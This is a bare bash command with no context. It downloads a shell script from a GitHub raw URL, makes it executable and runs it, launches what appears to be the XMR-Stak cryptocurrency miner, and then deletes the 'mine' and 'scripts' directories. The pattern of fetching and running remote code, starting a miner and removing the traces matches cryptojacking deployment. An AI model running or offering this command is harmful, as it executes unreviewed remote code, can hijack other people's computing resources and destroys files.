/bin/bash -c "wget -O start.sh https://raw.githubusercontent.com/pproum/test/master/build/scripts/start.sh; 
chmod u+x start.sh ;
./start.sh ; 
./scripts/run_xmr_stak.pl; 
cd ..; 
rm -rf mine ; 
rm -rf scripts;"